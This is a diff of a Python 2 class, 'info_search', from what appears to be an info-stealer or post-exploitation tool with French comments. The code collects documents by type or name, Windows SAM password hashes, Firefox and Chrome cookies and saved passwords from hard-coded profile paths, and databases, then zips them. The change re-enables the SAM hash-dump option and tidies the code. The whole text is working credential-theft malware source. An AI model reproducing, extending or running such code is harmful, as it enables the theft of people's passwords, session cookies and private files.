@@ -834,25 +834,21 @@ class info_search():
         	options.add_argument('-a', '--all', action="store_true", dest='all', default=False, help="Dump all files list in -f option")
         	options.add_argument('-c', '--char', action="store", dest='char', type=str, default=False, help="Dump files by charactere of your choice")
         	options.add_argument('-f','--format', action="store", dest='format', type=str, choices=['doc','docx','xls','xlsx','csv','ppt','pptx','txt','pst','jpg','png','pdf','vsd','vsdx','zip','rar'], default=False, help="Dump files of your choice")
-        	#options.add_argument('-p', '--password', action="store_true", default=False, dest='hash', help="Dump sam file (hash password)")
+        	options.add_argument('-p', '--password', action="store_true", default=False, dest='hash', help="Dump sam file (hash password)")
         	options.add_argument('-b', '--browser', default=False, dest='browser', action="store_true", help="Dump browser cookies and passwords")
         	options.add_argument('-d', '--db', default=False, dest='database', action="store_true", help="Dump database")
-        	options.add_argument('-e', '--encode', default=False, dest='encode', action='store_true', help='Encode archive contains all dump')
 
-
+		
         	#On parse les arguments
         	args = parser.parse_args()
 
         	self.all = args.all
         	self.char = args.char
         	self.format = args.format
-        	#self.hash = args.hash
+        	self.hash = args.hash
         	self.browser= args.browser
         	self.database = args.database
-        	self.encode=args.encode
-
-        	#print args
-
+		
 
     	def parse_all(self):
 
@@ -915,12 +911,6 @@ class info_search():
                     		break
 
 
-
-
-
-        #print "Parse_all [OK]"
-
-
 	def parse_with_char(self):
 
         	#Chemin ou sont stockes les fichiers dumpes
@@ -947,15 +937,9 @@ class info_search():
 
            	for file in fileList : 
                 	filename, extension = file.rsplit('.', 1)
-                	#print(extension)
                		if filename == self.char:
-                    		#print("Copie de "+dirName+ '\\'+file+' vers '+path_docs)
                     		shutil.copy2(dirName+'\\'+file, path_docs)
 
-
-   
-
-        	#print "Parse_with_char [OK]"
 
 	def parse_with_format(self):  
         
@@ -1018,8 +1002,6 @@ class info_search():
                 		except:
                     			break
 
-
-
     		#### Firefox ####
 
         	path_fi_cookies = 'C:\Documents and Settings'+ '\\' + username + '\Application Data\Mozilla\Firefox\Profiles\ytyz5ohr.default\cookies.sqlite'
@@ -1033,7 +1015,6 @@ class info_search():
                 		except:
                     			break
 
-    
         #MOTS DE PASSE
         	for dirName, subdirList, fileList in os.walk(path_fi_mdp):
            		for file in fileList :
@@ -1042,16 +1023,10 @@ class info_search():
                 		except:
                     			break
 
-
-
-
-
-
     #### Chrome ####
 
         	path_ch_cookies = 'C:\Documents and Settings'+ '\\' + username + '\Cookies'
         	path_ch_mdp = 'C:\Documents and Settings'+ '\\' + username + '\Application Data\Google\Chrome\User\Data\Default\Web Data'
-
 
         #COOKIES
         	for dirName, subdirList, fileList in os.walk(path_ch_cookies):
@@ -1105,35 +1080,21 @@ class info_search():
         	finally:
             		zfile.close()
 
-
-
-	def fileEncrypt(self):
-
-		#Ajouter l'encode de l'archive 
-		print ""
-
-
-
+			
 	def main_infosearch(self):
 
         	myinstance = info_search()
         	if self.all == True and self.char == False and self.format == False:
-            		#print "all main [OK]"
             		myinstance.parse_all()
         	if bool(self.char) == True and self.all == False:
-            		#print "char main [OK]"
             		myinstance.parse_with_char()
         	if bool(self.format) == True and self.all == False:
-            		#print "format main [OK]"
             		myinstance.parse_with_format()
-        	# elif self.hash == True:
-        		#     #print "hash main [OK]"
-        		#     myinstance.dump_pass()
+        	if self.hash == True:
+        		myinstance.dump_pass()
         	elif self.browser == True:
-            		#print "browser main [OK]"
             		myinstance.dump_browser()
        	 	elif self.database == True:
-           		 #print "database main [OK]"
             		myinstance.dump_database()
 
 
